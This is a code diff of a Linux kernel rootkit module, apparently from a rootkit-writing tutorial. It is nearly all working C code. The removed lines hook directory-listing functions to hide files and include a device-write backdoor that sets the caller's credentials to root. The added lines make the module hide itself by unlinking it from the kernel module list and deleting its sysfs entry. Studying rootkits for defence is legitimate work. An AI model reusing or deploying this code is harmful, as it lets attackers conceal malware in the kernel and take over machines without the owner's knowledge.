@@ -29,27 +29,6 @@ static struct file_operations a3_rootkit_ops = {
     .unlocked_ioctl = a3_rootkit_ioctl,
 };
 
-/*hide file*/
-#define HOOK_BUF_SZ 0x30
-
-struct hook_info {
-    char hook_data[HOOK_BUF_SZ];
-    char orig_data[HOOK_BUF_SZ];
-    void (*hook_before) (size_t *args);
-    size_t (*orig_func) (size_t, size_t, size_t, size_t, size_t, size_t);
-    size_t (*hook_after) (size_t orig_ret, size_t *args);
-};
-
-struct hook_info filldir_hook_info,filldir64_hook_info,compat_filldir_hook_info;
-filldir_t filldir, filldir64, compat_filldir;
-
-struct hide_file_info {
-    struct list_head list;
-    char *file_name;
-};
-
-struct list_head hide_file_list;
-
 //读取cr0寄存器
 size_t a3_rootkit_read_cr0(void)
 {
@@ -131,75 +110,32 @@ void a3_rootkit_write_romem_by_pte_patch(void *dst, void *src, size_t len)
     dst_pte->pte = orig_pte_val.pte;
 }
 
-/* 一共要 hook 三个函数，因此还有另外两个和这个函数一模一样的函数，就不重复 copy 代码了：） */
-size_t a3_rootkit_evil_filldir(size_t arg0, size_t arg1, size_t arg2, 
-                               size_t arg3, size_t arg4, size_t arg5)
+/*hide module*/
+void a3_rootkit_hide_module_sysfs(void)
 {
-    struct hide_file_info *info = NULL;
-    size_t args[6], ret;
-
-    args[0] = arg0;
-    args[1] = arg1;
-    args[2] = arg2;
-    args[3] = arg3;
-    args[4] = arg4;
-    args[5] = arg5;
-
-    /* patch and call the original function */
-    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
-                                              filldir_hook_info.orig_data, 
-                                              HOOK_BUF_SZ);
-
-    /* check for whether the file to be hide is in result and delete them */
-    list_for_each_entry(info, &hide_file_list, list) {
-        if (!strncmp(info->file_name, args[1], args[2])) {
-            ret = 1; /* it should be true, otherwise the iterate will stop */
-            goto hide_out;
-        }
-    }
-
-    /* normally fill */
-    ret = filldir_hook_info.orig_func(args[0], args[1], args[2], 
-                                      args[3], args[4], args[5]);
-
-hide_out:
-    /* re-patch the hook point again */
-    a3_rootkit_write_read_only_mem_by_ioremap(filldir_hook_info.orig_func, 
-                                              filldir_hook_info.hook_data, 
-                                              HOOK_BUF_SZ);
-
-    return ret;
+    kobject_del(&(THIS_MODULE->mkobj.kobj));
 }
 
-//...
-
-/* 你需要在模块初始化函数中调用该函数 */
-void a3_rootkit_hide_file_subsystem_init(void)
+void a3_rootkit_hide_module_procfs(void)
 {
-    INIT_LIST_HEAD(&hide_file_list);
-    a3_rootkit_text_hook(filldir, a3_rootkit_evil_filldir, 
-                         &filldir_hook_info);
-    a3_rootkit_text_hook(filldir64, a3_rootkit_evil_filldir64, 
-                         &filldir64_hook_info);
-    a3_rootkit_text_hook(compat_filldir, a3_rootkit_evil_compat_filldir, 
-                         &compat_filldir_hook_info);
+    struct list_head *list;
+
+    list = &(THIS_MODULE->list);
+    list->prev->next = list->next;
+    list->next->prev = list->prev;
 }
 
-/* 这个函数用来添加新的隐藏文件：） */
-void a3_rootkit_add_new_hide_file(const char *file_name)
+void a3_rootkit_hide_module(void)
 {
-    struct hide_file_info *info;
-
-    info = kmalloc(sizeof(*info), GFP_KERNEL);
-    info->file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);
-    strcpy(info->file_name, file_name);
-
-    list_add(&info->list, &hide_file_list);
+    a3_rootkit_hide_module_procfs();
+    a3_rootkit_hide_module_sysfs();
 }
 
 static int __init a3_rootkit_init(void)
 {
     int err_code;
+    a3_rootkit_hide_module();
+    printk(KERN_INFO"[a3_rootkit:] Module loaded. start to hide module");
 
     printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");
 
@@ -250,19 +186,6 @@ static void __exit a3_rootkit_exit(void)
     printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
 }
 
-void a3_rootkit_write_read_only_mem_by_ioremap(void *dst, void *src, size_t len)
-{
-    size_t dst_phys_page_addr, dst_offset;
-    void* dst_ioremap_addr;
-
-    dst_phys_page_addr = page_to_pfn(virt_to_page(dst)) * PAGE_SIZE;
-    dst_offset = (size_t) dst & 0xfff;
-
-    dst_ioremap_addr = (void*) ioremap(dst_phys_page_addr, len + 0x1000);
-    memcpy((void*)(dst_ioremap_addr + dst_offset), src, len);
-    iounmap(dst_ioremap_addr);
-}
-
 static int a3_rootkit_open(struct inode *inode, struct file *file)
 {
     return 0;
@@ -277,18 +200,7 @@ static ssize_t a3_rootkit_read(struct file *file, char __user *buf,
 static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                 size_t count, loff_t *start)
 {
-    static char usr_data[0x100];
-    int sz = count > 0x100 ? 0x100 : count;
-
-    copy_from_user(usr_data, buf, sz);
-
-    if (!strncmp(usr_data, "root", 4)) {
-        struct cred *curr = current->cred;
-        curr->uid = curr->euid = curr->suid = curr->fsuid = KUIDT_INIT(0);
-        curr->gid = curr->egid = curr->sgid = curr->fsgid = KGIDT_INIT(0);
-    }
-
-    return sz;
+    return count;
 }
 
 static int a3_rootkit_release(struct inode *inode, struct file *file)
